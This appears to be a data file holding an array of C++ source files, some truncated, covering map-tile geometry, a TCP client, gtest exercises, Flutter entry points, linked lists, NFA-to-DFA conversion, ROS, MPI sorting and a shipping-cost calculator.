    "#include <mbgl/util/geo.hpp>\n#include <cmath>\n#include <iostream>\n\nnamespace mbgl\n{\n\n    LatLng convertTilesToCoordinates(int x, int y, int zoom)\n    {\n        double n = std::pow(2.0, zoom);\n        double lon = (static_cast<double>(x) / n) * 360.0 - 180.0;\n        double latRad = std::atan(std::sinh(M_PI * (1.0 - (2.0 * static_cast<double>(y)) / n)));\n        double lat = latRad * 180.0 / M_PI;\n        return LatLng{lat, lon, mbgl::LatLng::Unwrapped};\n    }\n\n    LatLng calculateNormalizedCenterCoords(int x, int y, int zoom)\n    {\n        LatLng nw = convertTilesToCoordinates(x, y, zoom);\n        LatLng se = convertTilesToCoordinates(x + 1, y + 1, zoom);\n\n        double mercatorNwY = std::log(std::tan(M_PI / 4.0 + (nw.latitude() * M_PI) / 360.0));\n        double mercatorSeY = std::log(std::tan(M_PI / 4.0 + (se.latitude() * M_PI) / 360.0));\n        double avgMercatorY = (mercatorNwY + mercatorSeY) / 2.0;\n        double centerLat = (std::atan(std::exp(avgMercatorY)) * 360.0) / M_PI - 90.0;\n\n        double centerLon = (nw.longitude() + se.longitude()) / 2.0;\n\n        return LatLng{centerLat, centerLon, mbgl::LatLng::Wrapped};\n    }\n\n} // namespace mbgl",
    "/* This file makes use of Doxygen syntax for generating documentation. */\n/******************************************************************************/\n/**\n * @file tcp_client.cpp\n * @brief File containing methods for communicating with a TCP server.\n *\n * This file provides TCPClient member definitions for communicating with a\n * TCP server.\n *\n * @author willisjh\n * @date 22 March 2022\n *\n * @bug No known bugs.\n *\n * @addtogroup TCPClient\n * @{\n *\n ******************************************************************************/\n\n\n/******************************** Include Files *******************************/\n#include \"common/socket/tcp_client.hpp\"\n\n#include <netdb.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <stdexcept>\n#include <string>\n#include <cstring>\n#include <cerrno>\n#include <ratio>\n\n#include \"common/log_msg/log_msg.hpp\"\n\n/**************************** Constant Definitions ****************************/\n\n/*********************** Static Variable Initializations **********************/\n\n/****************************** Type Definitions ******************************/\n\n/***************************** Function Prototypes ****************************/\n\n\n/******************************************************************************/\n/**\n * Default constructor for TCPClient.\n *\n * @param None.\n *\n * @return None.\n *\n * @note\n *\n ******************************************************************************/\nTCPClient::TCPClient()\n    : fd_socket_(-1)\n    , f_connected_()\n{\n\n}\n\n/******************************************************************************/\n/**\n * Constructor for TCPClient with SockConnect() initialization.\n *\n * @param None.\n *\n * @return None.\n *\n * @note\n *\n ******************************************************************************/\nTCPClient::TCPClient(const char* sz_hostname, uint16_t id_port, const std::chrono::duration<float> time_timeout)\n    : fd_socket_(-1)\n    , f_connected_()\n{\n    SockConnect(sz_hostname, id_port, time_timeout);\n}\n\n/******************************************************************************/\n/**\n * Deconstructor for TCPClient.\n *\n * @param None.\n *\n * @return None.\n *\n * @note\n *\n ******************************************************************************/\nTCPClient::~TCPClient()\n{\n    SockClose();\n}\n\n/******************************************************************************/\n/**\n * Method for connecting over TCP.\n *\n * @param[in] sz_hostname  The zero-terminated string of the hostname.\n * @param[in] id_port      The identifier of the port.\n * @param[in] time_timeout The time for connection timeout.\n *\n * @return None.\n *\n * @note Connection is limited to IPv4.\n *\n ******************************************************************************/\nvoid TCPClient::SockConnect(const char* sz_hostname, uint16_t id_port, const std::chrono::duration<float> time_timeout)\n{\n    /**- Create a socket for connecting over TCP. */\n    fd_socket_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n    if (fd_socket_ == -1)\n    {\n        if ((errno == EACCES) || (errno == EAFNOSUPPORT) || (errno == EINVAL) || (errno == EPROTONOSUPPORT))\n        {\n            throw ExceptionPriority<std::runtime_error>(IDPriority::kIdNotice, \"Socket creation failed: \" + static_cast<std::string>(std::strerror(errno)));\n        }\n\n        throw ExceptionPriority<std::runtime_error>(IDPriority::kIdErr, \"Socket creation failed: \" + static_cast<std::string>(std::strerror(errno)));\n    }\n\n    /**- Make the data socket non-blocking. */\n    auto val_socket_flags = fcntl(fd_socket_, F_GETFL);\n    if (val_socket_flags == -1)\n    {\n        throw std::runtime_error(\"Socket flags retrieval failed: \" + static_cast<std::string>(std::strerror(errno)));\n    }\n    if (fcntl(fd_socket_, F_SETFL, val_socket_flags | O_NONBLOCK) == -1)\n    {\n        throw std::runtime_error(\"Socket flags setting failed: \" + static_cast<std::string>(std::strerror(errno)));\n    }\n\n    /**- Lookup provided hostname. */\n    struct addrinfo addrinfo_hints = {};\n    addrinfo_hints.ai_family = AF_INET;\n    addrinfo_hints.ai_socktype = SOCK_STREAM;\n    addrinfo_hints.ai_flags |= AI_CANONNAME;\n\n    struct addrinfo* p_addrinfo_result = {};\n\n    /* Second argument is the service name argument. This could allow auto-retrieving the port number. */\n    if (getaddrinfo(sz_hostname, nullptr, &addrinfo_hints, &p_addrinfo_result) != 0)\n    {\n        throw std::runtime_error(\"Hostname lookup failed for IPv4!\");\n    }\n\n    /**- Initialize socket address structure with provided info. */\n    struct sockaddr_in sockaddr_afinet = {};\n    sockaddr_afinet.sin_family = AF_INET;\n    sockaddr_afinet.sin_port = htons(id_port);\n    sockaddr_afinet.sin_addr = reinterpret_cast<struct sockaddr_in*>(p_addrinfo_result->ai_addr)->sin_addr;\n\n    freeaddrinfo(p_addrinfo_result);\n\n    /**- Connect over TCP. */\n    if (connect(fd_socket_, reinterpret_cast<struct sockaddr*>(&sockaddr_afinet), sizeof(sockaddr_afine",
    "#include <excercises.h>\n#include <gtest/gtest.h>\n\nTEST(HousesOut, TestHouses) {\n  testing::internal::CaptureStdout();\n\n  exercise_12(\"red\", 3, \"green\", 3, \"green\", 2, \"green\", -1);\n\n  std::string YOUR_OUTPUT = testing::internal::GetCapturedStdout();\n  ASSERT_EQ(YOUR_OUTPUT, \"2\\n3\\n\");\n}\n\nTEST(HousesOut, TestHouses2) {\n  testing::internal::CaptureStdout();\n\n  exercise_12(\"red\", 2, \"green\", 1, \"red\", 3, \"red\", 3);\n\n  std::string YOUR_OUTPUT = testing::internal::GetCapturedStdout();\n  ASSERT_EQ(YOUR_OUTPUT, \"3\\n\");\n}\n\nTEST(HousesOut, TestHouses3) {\n  testing::internal::CaptureStdout();\n\n  exercise_12(\"red\", 1, \"green\", 2, \"blue\", 3, \"yellow\", 3);\n\n  std::string YOUR_OUTPUT = testing::internal::GetCapturedStdout();\n  ASSERT_EQ(YOUR_OUTPUT, \"\");\n}\n\nTEST(HousesOut, TestHouses4) {\n  testing::internal::CaptureStdout();\n\n  exercise_12(\"grey\", 5, \"grey\", 5, \"grey\", 5, \"grey\", 5);\n\n  std::string YOUR_OUTPUT = testing::internal::GetCapturedStdout();\n  ASSERT_EQ(YOUR_OUTPUT, \"1\\n2\\n3\\n\");\n}\n\nint main(int argc, char** argv) {\n  ::testing::InitGoogleTest(&argc, argv);\n  return RUN_ALL_TESTS();\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"primeiro_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n\nstruct Node {\n     int data;\n     Node* next;\n};\n\nclass LinkedList {\npublic:\n     LinkedList() : head(nullptr) {}\n\n     void createFromArray(int arr[], int size) {\n          if (size == 0) return;\n          head = new Node{arr[0], nullptr};\n          Node* current = head;\n          for (int i = 1; i < size; ++i) {\n               current->next = new Node{arr[i], nullptr};\n               current = current->next;\n          }\n     }\n\n     void display() const {\n          Node* current = head;\n          while (current != nullptr) {\n               std::cout << current->data << \" \";\n               current = current->next;\n          }\n          std::cout << std::endl;\n     }\n\n     ~LinkedList() {\n          Node* current = head;\n          while (current != nullptr) {\n               Node* next = current->next;\n               delete current;\n               current = next;\n          }\n     }\n\nprivate:\n     Node* head;\n};\n\nint main() {\n     int arr[] = {1, 2, 3, 4, 5};\n     int size = sizeof(arr) / sizeof(arr[0]);\n\n     LinkedList list;\n     list.createFromArray(arr, size);\n     list.display();\n\n     return 0;\n}",
    "#include \"NFA.h\"\n\n/* ------------------- Constructors ------------------- */\n// Accepting a single terminal L(M) = {\u03c3}\nNFA::NFA(string symbol)\n{   \n    this->startState = new Node();\n    Node* finalState = new Node();\n    \n    (this->startState)->addTransition(symbol,finalState);\n    this->finalStates.push_back(finalState);\n    \n    this->allStates.push_back(startState);\n    this->allStates.push_back(finalState);\n\n    this->regex << symbol;\n}\n\n// Empty NFA\nNFA::NFA()\n{\n    this->startState = nullptr;\n}\n\n\n/* -------------- NFA Combination Functions -------------- */ \n// Combining using '|'\nNFA* NFA::makeUnion(NFA* nfa1, NFA* nfa2)\n{\n    NFA* unionNFA = new NFA();\n\n    Node* newStartNode = new Node();\n    newStartNode->addTransition(epsilon,nfa1->startState);\n    newStartNode->addTransition(epsilon,nfa2->startState);\n\n    unionNFA->startState = newStartNode;\n    unionNFA->allStates.push_back(newStartNode);\n    this->mergeNFAs(unionNFA, nfa1, nfa2, true);\n\n    unionNFA->regex << nfa1->getRegex() << \"|\" << nfa2->getRegex();\n\n    return unionNFA;\n    \n}\n\n// Combining using concat operator\nNFA* NFA::makeConcat(NFA* nfa1, NFA* nfa2)\n{\n    NFA* concatNFA = new NFA();\n\n    concatNFA->startState = nfa1->startState;\n    for(Node* finalNode: nfa1->finalStates) finalNode->addTransition(epsilon,nfa2->startState);\n\n    this->mergeNFAs(concatNFA, nfa1, nfa2, false);\n\n    concatNFA->regex << nfa1->getRegex() << nfa2->getRegex();\n\n    return concatNFA;\n}\n\n// Combining using '*'\nNFA* NFA::makeKleeneStar()\n{\n    NFA* kleeneStarNFA = new NFA();\n    Node* specialNode = new Node();\n    kleeneStarNFA->startState = specialNode;\n    kleeneStarNFA->finalStates.push_back(specialNode);\n\n    specialNode->addTransition(epsilon,this->startState);\n    for(Node* node: this->finalStates){node->addTransition(epsilon, specialNode);}\n\n    kleeneStarNFA->allStates = this->allStates;\n    kleeneStarNFA->allStates.push_back(specialNode);\n\n    kleeneStarNFA->regex << \"*\";\n\n    return kleeneStarNFA;\n}\n\n// Merge NFAs (The set of states)\nvoid NFA::mergeNFAs(NFA* nfa, NFA* nfa1, NFA* nfa2, bool mergeFirstFinal)\n{\n    for(Node* node: nfa1->allStates){nfa->allStates.push_back(node);}\n    for(Node* node: nfa2->allStates){nfa->allStates.push_back(node);}\n\n    if(mergeFirstFinal) for(Node* node: nfa1->finalStates){nfa->finalStates.push_back(node);}\n    for(Node* node: nfa2->finalStates){nfa->finalStates.push_back(node);}\n    \n}\n\n\n/* ------------------- DFA Utils ------------------- */\n// Subset Construction\nNFA* NFA::makeDFA()\n{\n    unordered_map< string , string > subsetTransition_a, subsetTransition_b;\n    unordered_map< Node* , set<Node*> > delta_a, delta_b;\n \n    // Initialise table for singleton set of states\n    for(Node* node: this->allStates) this->findSingletonSetReachability(node, delta_a, delta_b);\n\n    // Find reachability for subsets\n    findSetReachability(subsetTransition_a ,subsetTransition_b , delta_a, delta_b);\n\n    NFA* dfa = new NFA();\n\n    string startStateName = \"{\"+ this->startState->getLabel() +\"}\";\n    set<string> reachableSubsetStates = filterReachableStates(subsetTransition_a, subsetTransition_b, startStateName);\n\n    // Get all final state labels\n    vector<string> finalStateNames;\n    for(Node* finalState: this->finalStates) finalStateNames.push_back(finalState->getLabel());\n    \n    // Create and Populate DFA states\n    stateCnt = 0;\n    unordered_map< string, Node* > createdStates;\n    for(string subsetState: reachableSubsetStates) \n    {\n        Node* newNode = new Node();\n        createdStates[subsetState] = newNode;\n        \n        //Check if it contains any final states\n        bool flag = false;\n        for(string finalState: finalStateNames) if(subsetState.find(finalState) != string::npos){flag = true; break;}\n        if(flag) dfa->finalStates.push_back(newNode);\n\n        // Add state to list\n        dfa->allStates.push_back(newNode);\n    }\n\n    // Add Start State\n    dfa->startState = createdStates[startStateName];\n\n    // Add transitions\n    for(string subsetState: reachableSubsetStates) \n    {\n        if(subsetTransition_a.find(subsetState) != subsetTransition_a.end() && createdStates.find(subsetTransition_a[subsetState]) != createdStates.end()) createdStates[subsetState]->addTransition(\"a\", createdStates[subsetTransition_a[subsetState]]);\n        if(subsetTransition_b.find(subsetState) != subsetTransition_b.end() && createdStates.find(subsetTransition_b[subsetState]) != createdStates.end()) createdStates[subsetState]->addTransition(\"b\", createdStates[subsetTransition_b[subsetState]]);\n    }\n   \n    return dfa;\n}\n\n// Removes Unreachable states\nset<string> NFA::filterReachableStates(unordered_map< string , string >& subsetTransition_a, unordered_map< string , string >& subsetTransition_b, string startStateName)\n{\n    // BFS traversal\n    queue< string > nodeQueue;\n    set< string > reachableStates; \n    nodeQueue.push(startStateName);\n\n    while (!nodeQueue.empty())\n    {\n        string node = nodeQueue.front();\n      ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"holbegram\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"students.hpp\"\r\n\r\n// Constructor\r\nStudent::Student()\r\n{\r\n    sid = 0;\r\n    sname = \"\";\r\n    sum = 0.0;\r\n    average = 0.0;\r\n    for (int i = 0; i < Nscores; i++)\r\n    {\r\n        scores[i] = 0.0;\r\n    }\r\n}\r\n\r\n// Setters\r\nvoid Student::setSid(int id)\r\n{\r\n    sid = id;\r\n}\r\n\r\nvoid Student::setSname(string name)\r\n{\r\n    sname = name;\r\n}\r\n\r\nvoid Student::setScores(int index, double score)\r\n{\r\n    if (index >= 0 && index < Nscores)\r\n    {\r\n        scores[index] = score;\r\n        sum = 0.0;\r\n        for (int i = 0; i < Nscores; i++)\r\n        {\r\n            sum += scores[i];\r\n        }\r\n        average = sum / Nscores;\r\n    }\r\n}\r\n\r\n// Getters\r\nint Student::getSID() const\r\n{\r\n    return sid;\r\n}\r\n\r\nstring Student::getSname() const\r\n{\r\n    return sname;\r\n}\r\n\r\ndouble Student::getScores(int index) const\r\n{\r\n    if (index >= 0 && index < Nscores)\r\n    {\r\n        return scores[index];\r\n    }\r\n    return 0.0;\r\n}\r\n\r\ndouble Student::getSum() const\r\n{\r\n    return sum;\r\n}\r\n\r\ndouble Student::getAvg() const\r\n{\r\n    return average;\r\n}",
    "#include <iostream>\n#include <unordered_map>\n#include <cmath>\n#include <climits>\n#include <bits/stdc++.h>\n\nusing namespace std;\n\n// Node structure to represent each element in the data structures\nstruct Node {\n    uint32_t value;\n    Node* next;\n    Node* prev;\n    Node(uint32_t val) : value(val), next(nullptr), prev(nullptr) {}\n};\n\n// Custom stack implementation using linked list\nclass CustomStack {\nprivate:\n    Node* top; // Pointer to the top element of the stack\n    int count; // Number of elements in the stack\n\npublic:\n    CustomStack() : top(nullptr), count(0) {}\n\n    ~CustomStack() {\n        // Destructor to clean up the stack\n        while (top != nullptr) {\n            Node* temp = top;\n            top = top->next;\n            delete temp;\n        }\n    }\n\n    // Push a new value onto the stack\n    void push(uint32_t value) {\n        Node* newNode = new Node(value);\n        newNode->next = top;\n        top = newNode;\n        count++;\n    }\n\n    // Pop the top value from the stack\n    void pop() {\n        if (top != nullptr) {\n            Node* temp = top;\n            top = top->next;\n            delete temp;\n            count--;\n        } else {\n            throw runtime_error(\"Stack is empty\");\n        }\n    }\n\n    // Peek at the top value without removing it\n    uint32_t peek() {\n        if (top != nullptr) {\n            return top->value;\n        }\n        throw runtime_error(\"Stack is empty\");\n    }\n\n    // Get the number of elements in the stack\n    int size() const {\n        return count;\n    }\n\n    // Check if the stack is empty\n    bool empty() const {\n        return count == 0;\n    }\n};\n\n// Custom queue implementation using linked list\nclass CustomQueue {\nprivate:\n    Node* head; // front element of the queue\n    Node* tail; // rear element of the queue\n    int count; \n\npublic:\n    CustomQueue() : head(nullptr), tail(nullptr), count(0) {}\n\n    ~CustomQueue() {\n        // Destructor to clean up the queue\n        while (head != nullptr) {\n            Node* temp = head;\n            head = head->next;\n            delete temp;\n        }\n    }\n\n    // Enqueue a new value to the rear of the queue\n    void push(uint32_t value) {\n        Node* newNode = new Node(value);\n        if (tail != nullptr) {\n            tail->next = newNode;\n        }\n        tail = newNode;\n        if (head == nullptr) {\n            head = newNode;\n        }\n        count++;\n    }\n\n    // Dequeue the front value from the queue\n    void pop() {\n        if (head != nullptr) {\n            Node* temp = head;\n            head = head->next;\n            if (head == nullptr) {\n                tail = nullptr;\n            }\n            delete temp;\n            count--;\n        } else {\n            throw runtime_error(\"Queue is empty\");\n        }\n    }\n\n    // Peek at the front value without removing it\n    uint32_t front() {\n        if (head != nullptr) {\n            return head->value;\n        }\n        throw runtime_error(\"Queue is empty\");\n    }\n\n    // Get the number of elements in the queue\n    int size() const {\n        return count;\n    }\n\n    // Check if the queue is empty\n    bool empty() const {\n        return count == 0;\n    }\n};\n\n// Custom doubly linked list implementation\nclass CustomDoubleLinkedList {\nprivate:\n    Node* head; // head of the list\n    Node* tail; // tail of the list\n    int count;  // Number of elements in the list\n\npublic:\n    CustomDoubleLinkedList() : head(nullptr), tail(nullptr), count(0) {}\n\n    ~CustomDoubleLinkedList() {\n        // Destructor to clean up the list\n        while (head != nullptr) {\n            Node* temp = head;\n            head = head->next;\n            delete temp;\n        }\n    }\n\n    // Add a new value to the front of the list\n    void push_front(uint32_t value) {\n        Node* newNode = new Node(value);\n        if (head != nullptr) {\n            head->prev = newNode;\n            newNode->next = head;\n        }\n        head = newNode;\n        if (tail == nullptr) {\n            tail = newNode;\n        }\n        count++;\n    }\n\n    // Remove the value from the back of the list\n    void pop_back() {\n        if (tail != nullptr) {\n            Node* temp = tail;\n            tail = tail->prev;\n            if (tail != nullptr) {\n                tail->next = nullptr;\n            } else {\n                head = nullptr;\n            }\n            delete temp;\n            count--;\n        }\n    }\n\n    // Get the value from the back of the list\n    uint32_t back() const {\n        if (tail != nullptr) {\n            return tail->value;\n        }\n        throw runtime_error(\"List is empty\");\n    }\n\n    // Erase a specific node from the list\n    void erase(Node* node) {\n        if (node->prev != nullptr) {\n            node->prev->next = node->next;\n        } else {\n            head = node->next;\n        }\n        if (node->next != nullptr) {\n            node->next->prev = node->prev;\n        } else {\n            tail = node->prev;\n        }\n        delete node;\n        count--;\n    }\n\n    // G",
    "#include \"rclcpp/rclcpp.hpp\"\n#include \"tf2_ros/transform_listener.h\"\n\nclass TfListenerNode : public rclcpp::Node\n{\npublic:\n    TfListenerNode() : Node(\"tf_listener_node\")\n    {\n        tf_buffer_ = std::make_shared<tf2::Buffer>();\n        transform_listener_ = std::make_shared<tf2_ros::TransformListener>(*tf_buffer_);\n\n        // Specify the target frame and time in the future to look for a transform\n        target_frame_ = \"base_link\";                                       // Change this to the frame you're interested in\n        future_time_ = rclcpp::Time(this->now()) + rclcpp::Duration(2, 0); // 2 seconds in the future\n\n        // Using a timer to check for transforms periodically\n        timer_ = this->create_wall_timer(\n            std::chrono::seconds(1), std::bind(&TfListenerNode::checkTransform, this));\n    }\n\nprivate:\n    void checkTransform()\n    {\n        try\n        {\n            auto transform = tf_buffer_->lookupTransform(\"map\", target_frame_, future_time_);\n\n            RCLCPP_INFO(this->get_logger(), \"Received transform from %s to %s\",\n                        transform.header.frame_id.c_str(),\n                        target_frame_.c_str());\n        }\n        catch (tf2::TransformException &ex)\n        {\n            RCLCPP_INFO(this->get_logger(), \"No transform available: %s\", ex.what());\n        }\n    }\n\n    std::shared_ptr<tf2::Buffer> tf_buffer_;\n    std::shared_ptr<tf2_ros::TransformListener> transform_listener_;\n    std::string target_frame_;\n    rclcpp::Time future_time_;\n    rclcpp::TimerBase::SharedPtr timer_;\n};\n\nint main(int argc, char **argv)\n{\n    rclcpp::init(argc, argv);\n    auto node = std::make_shared<TfListenerNode>();\n    rclcpp::spin(node);\n    rclcpp::shutdown();\n    return 0;\n}",
    "#include <mpi.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <math.h>\r\n#include <time.h>\r\n#include <vector>\r\n#include <iostream>\r\n#include <string.h>\r\n\r\nusing namespace std;\r\n\r\n\r\n int getNextGroup (int i, int id , int d);\r\n int choosePivot(int A[], int size);\r\n void split(int A[], int size, int pivot, int &midIndex, int &lowLen, int &highLen);\r\n bool shouldPassLargerList (int iteration, int comm_rank, int d);\r\n  int getCommLink (int iteration, int comm_rank, int dimensions);\r\n  void sort(int A[], int size) ;\r\n\r\nvoid printBuffer(int A[], int size) {\r\n    std::cout << \"[\";\r\n    for (int i = 0; i < size; i++) {\r\n        std::cout << A[i];\r\n        if (i < size - 1) {\r\n            std::cout << \", \";\r\n        }\r\n    }\r\n    std::cout << \"]\";\r\n}\r\n  \r\n //void performPivotSelection(int id, int num_process, std::vector<int>& new_chunk_array,MPI_Comm currComm);\r\n\r\n\r\nint main(int argc, char *argv[]) {\r\n    \r\nint size = atoi(argv[1]),                       // size of array\r\n        arr[size],                                  // declare array\r\n        sorted_array[size], \r\n        id, \r\n        num_process,\r\n        d,                       // declare sorted array\r\n        i;\r\n\r\n  double local_start_time = MPI_Wtime();\r\n    \r\n    \r\n    MPI_Init(&argc, &argv);\r\n    MPI_Comm_rank(MPI_COMM_WORLD, &id);\r\n    MPI_Comm_size(MPI_COMM_WORLD, &num_process);\r\n\r\n    \r\n\r\n    d = static_cast<int>(log2(num_process));\r\n    int gp_size = num_process/2;\r\n\r\n    if (id == 0){\r\n\r\n   /**Initialization checks*/\r\n    if (num_process <= 0 || (num_process & (num_process - 1)) != 0) {\r\n        std::cerr << \"Number of processes must be a power of 2.\";\r\n        MPI_Abort(MPI_COMM_WORLD, 1);}\r\n\r\n    if(num_process > size){\r\n          std::cerr << \"Number of processes must less than or equal to number of elements.\";\r\n          MPI_Abort(MPI_COMM_WORLD, 1);}    \r\n\r\n    }\r\n    \r\n    /**Generate random array\r\n     * Prints the unsorted array\r\n     */\r\n    if(id==0){ \r\n          \r\n          printf(\"Number of processes:%d\\n\",num_process);  \r\n          printf(\"It is %d dimension\\n\",d);                           \r\n          \r\n          for(i=0; i<size; i++){                  \r\n            arr[i] = rand()%100 + 1;\r\n          }\r\n\r\n          printf(\"\\nThis is the unsorted array:\\n\");\r\n          for(i=0; i<size; i++){\r\n            printf(\"%d \", arr[i]);\r\n          }\r\n       \r\n          printf(\"\\n \\n\");\r\n             \r\n    }\r\n\r\n    /**\r\n     * Calculates sendcounts and displacements for each process\r\n     * to Scatter the array accordinly\r\n     * \r\n    */\r\n    int sendcounts[num_process],\r\n        displs[num_process],\r\n        chunk_array[100],\r\n        chunk_size,\r\n        rem =  size%num_process,\r\n        sum = 0;\r\n    \r\n    \r\n    for (i = 0; i < num_process; i++) {\r\n        sendcounts[i] = size/num_process;\r\n        if (rem > 0) {\r\n            sendcounts[i]++;\r\n            rem--;\r\n        }\r\n\r\n        displs[i] = sum;\r\n        sum += sendcounts[i];\r\n    }\r\n\r\n    if (id == 0) {\r\n        for (i = 0; i < num_process; i++) {\r\n            printf(\"sendcounts[%d] = %d\\tdispls[%d] = %d\\n\", i, sendcounts[i], i, displs[i]);\r\n        }\r\n                                                                                                                                                                                                                                                                                                                                                                                                                                   \r\n    }\r\n\r\n    /**Scatter the array to each process from the root process*/\r\n    MPI_Scatterv(arr, sendcounts, displs, MPI_INT, &chunk_array, 100, MPI_INT, 0, MPI_COMM_WORLD);\r\n\r\n    /**new_chunk_array is the chunk recieved by each processor**/\r\n    vector<int> new_chunk_array; \r\n\r\nchunk_size = sendcounts[id]; \r\n    if(id == 0){\r\n    \r\n        \r\n        for(int i=0; i<chunk_size; i++){\r\n            new_chunk_array.push_back(chunk_array[i]);\r\n        }\r\n        printf(\"process:%d chunck:\",id);\r\n        for(int i=0; i<chunk_size; i++){\r\n          // printf(\"%d \",chunk_array[i]);\r\n        }\r\n        printf(\"\\n \\n\");\r\n    }\r\n    else{\r\n\r\n        //chunk_size = sendcounts[id];\r\n        for(int i=0; i<chunk_size; i++){\r\n           new_chunk_array.push_back(chunk_array[i]);\r\n        }\r\n        printf(\"process:%d chunck:\",id);\r\n        for(int i=0; i<chunk_size; i++){\r\n           // printf(\"%d \", chunk_array[i]);\r\n        }\r\n        printf(\"\\n \\n\");\r\n    \r\n    }\r\n\r\n/**COMMUNICATION AND EXCHANGE*/\r\n    MPI_Comm currComm = MPI_COMM_WORLD;\r\n    for(i=1;i<=d;i++){\r\n\r\n    int currentRank;\r\n    int pivot;\r\n    int currentSize;\r\n    MPI_Comm_rank(currComm, &currentRank);\r\n    MPI_Comm_size(currComm, &currentSize);\r\n\r\n    \r\n    \r\n    if(currentRank==0){\r\n\r\n       //printf(\"\\ndimension: %d\\n\",i);\r\n\r\n       pivot = choosePivot(chunk_array, chunk_size);\r\n       \r\n\r\n    }   \r\n\r\n     MPI_Bcast(&pivot, 1, MPI_INT, 0, currComm);\r\n\r\n     if (c",
    "#include <iostream>\n#include <iomanip>\nusing namespace std;\n\nint main()\n{\n    int weight;\n    int miles;\n    \n    cout << \"Please enter the weight of your package in kg:\" << endl;\n    cin >> weight;\n    if (weight < 0 || weight > 20)\n    {\n        cout << \"We are sorry, but we cannot ship your package.\" << endl;\n        return 0;\n    }\n    cout << \"How many miles will it be shipped?\" << endl;\n    cin >> miles;\n    double ratePerMiles = miles / 500;\n    double pricePerSmall = ratePerMiles * 1.10;\n    double pricePerMedium = ratePerMiles * 2.20;\n    double pricePerLarge = ratePerMiles * 3.70;\n    double pricePerXL = ratePerMiles * 4.80;\n    if (miles < 10 || miles > 3000)\n    {\n        cout << \"We are sorry, but we cannot ship your package that distance.\" << endl;\n    }\n    else if (weight <= 2)\n    {\n        cout << \"Your total cost is $\" << fixed << setprecision(2) << pricePerSmall << \" to ship your package.\" << endl;\n    }\n    else if (weight > 2 && weight <= 6)\n    {\n        cout << \"Your total cost is $\" << fixed << setprecision(2) << pricePerMedium << \" to ship your package.\" << endl;\n    }\n    else if (weight > 6 && weight <= 10)\n    {\n        cout << \"Your total cost is $\" << fixed << setprecision(2) << pricePerLarge << \" to ship your package.\" << endl;\n    }\n    else if (weight > 10 && weight <= 20)\n    {\n        cout << \"Your total cost is $\" << fixed << setprecision(2) << pricePerXL << \" to ship your package.\" << endl;\n    }\n}\n",
    "/*\n---------------------------------------------------------------------------\nOpen Asset Import Library (assimp)\n---------------------------------------------------------------------------\n\nCopyright (c) 2006-2024, assimp team\n\nAll rights reserved.\n\nRedistribution and use of this software in source and binary forms,\nwith or without modification, are permitted provided that the following\nconditions are met:\n\n* Redistributions of source code must retain the above\n  copyright notice, this list of conditions and the\n  following disclaimer.\n\n* Redistributions in binary form must reproduce the above\n  copyright notice, this list of conditions and the\n  following disclaimer in the documentation and/or other\n  materials provided with the distribution.\n\n* Neither the name of the assimp team, nor the names of its\n  contributors may be used to endorse or promote products\n  derived from this software without specific prior\n  written permission of the assimp team.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n\"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT 